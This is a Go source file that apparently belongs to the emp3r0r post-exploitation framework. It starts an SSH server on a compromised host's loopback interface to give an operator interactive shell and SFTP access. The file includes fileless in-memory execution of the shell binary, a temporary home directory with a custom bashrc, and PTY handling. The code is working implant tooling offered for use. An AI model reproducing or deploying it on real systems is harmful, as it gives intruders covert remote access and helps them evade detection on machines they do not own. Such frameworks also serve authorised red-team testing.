//go:build !windows
// +build !windows

package ssh

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func setWinsize(f *os.File, w, h int) {
	winsize := &pty.Winsize{
		Rows: uint16(h),
		Cols: uint16(w),
	}
	if err := pty.Setsize(f, winsize); err != nil {
		logging.Printf("error resizing pty: %s", err)
	}
}

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	// shell from memory
	var exe string
	var shellData []byte
	isMemShell := strings.HasPrefix(shell, "mem:") || strings.HasPrefix(shell, "mem://")
	if isMemShell {
		shellData, err = util.ReadFileAgent(shell)
		if err != nil {
			logging.Printf("sshd: read shell %s from memory: %v", shell, err)
			return
		}
	} else {
		exe, err = exec.LookPath(shell)
		if err != nil && shell != "sftp" {
			res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
			logging.Print(res)
			return
		}
	}

	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	ssh_server.Handle(func(s ssh.Session) {
		defer s.Close()
		var cmd *exec.Cmd

		// in-memory execution or disk-based?
		if !isMemShell {
			cmd = exec.Command(exe, args...)
			cmd.Env = os.Environ()
		}

		// we have a special bashrc and we would like to apply it
		if shell == "bash" {
			temp_bash_dir := fmt.Sprintf("%s/emp3r0r-%s", os.TempDir(), util.RandMD5String())
			os.MkdirAll(temp_bash_dir, 0700)
			custom_bash := temp_bash_dir + "/bash"

			// We might need to rethink how vaccine works, but for now we'll look in a common place or skip
			if !util.IsFileExist(custom_bash) {
				// Try to find it in the current directory as a fallback
				if util.IsFileExist("./bash") {
					os.Symlink("./bash", custom_bash)
				}
			}

			if !util.IsFileExist(custom_bash) {
				logging.Printf("sshd: custom bash not found at %s, skipping custom bashrc", custom_bash)
			} else {
				bashrc := fmt.Sprintf("%s/.bashrc", temp_bash_dir)
				err = external_file.ExtractBashRC(custom_bash, bashrc)
				if err != nil {
					logging.Printf("sshd: extract built-in bashrc: %v", err)
				} else if !isMemShell {
					cmd = exec.Command(custom_bash)
					os.Setenv("HOME", temp_bash_dir)
					os.Setenv("SHELL", cmd.Path)
					cmd.Env = os.Environ()
				}
			}
		}

		if !isMemShell {
			// remove empty arg in cmd.Args
			var tmp_args []string
			for _, arg := range cmd.Args {
				if strings.TrimSpace(arg) != "" {
					tmp_args = append(tmp_args, arg)
				}
			}
			cmd.Args = tmp_args
			logging.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)
		}

		ptyReq, winCh, isPTY := s.Pty()
		if !isPTY {
			logging.Print("Got an SSH request, but not a PTY request, aborting")
			s.Write([]byte("Not a PTY request"))
			return
		}
		logging.Printf("Got an SSH PTY request: %s", ptyReq.Term)

		var f *os.File
		var pid int
		if isMemShell {
			// run from memory
			var pty_f *os.File
			pty_f, f, err = pty.Open()
			if err != nil {
				err = fmt.Errorf("open pty failed: %v", err)
				io.WriteString(s, err.Error())
				return
			}
			defer pty_f.Close()
			pid, err = exeutil.InMemExePTYRun(shellData, append([]string{shell}, args...), os.Environ(), int(f.Fd()))
			if err != nil {
				err = fmt.Errorf("InMemExePTYRun failed: %v", err)
				io.WriteString(s, err.Error())
				return
			}
			f = pty_f // we use the master PTY for I/O
		} else {
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
			f, err = pty.Start(cmd)
			if err != nil {
				err = fmt.Errorf("start shell with PTY failed: %v", err)
				io.WriteString(s, err.Error())
				logging.Print(err)
				return
			}
			pid = cmd.Process.Pid
		}

		go func() {
			for win := range winCh {
				logging.Printf("set pty size to %dx%d", win.Width, win.Height)
				setWinsize(f, win.Width, win.Height)
			}
		}()
		go func() {
			defer func() {
				logging.Printf("Closing PTY file: %s", f.Name())
				f.Close()
				if util.IsPIDAlive(pid) {
					p, _ := os.FindProcess(pid)
					if p != nil {
						p.Kill()
					}
					logging.Printf("Killed PTY process %d", pid)
				}
			}()
			_, err = io.Copy(f, s) // stdin
			if err != nil {
				err = fmt.Errorf("error: IO copy from SSH to PTY: %v", err)
				logging.Print(err)
				io.WriteString(s, err.Error())
			}
		}()
		if !util.IsPIDAlive(pid) {
			err = fmt.Errorf("PTY process %d died prematurely", pid)
			logging.Print(err)
			io.WriteString(s, err.Error())
		}
		_, err = io.Copy(s, f) // stdout
		if err != nil {
			err = fmt.Errorf("error: IO copy from PTY to SSH: %v", err)
			logging.Print(err)
			io.WriteString(s, err.Error())
		}
	})

	logging.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}
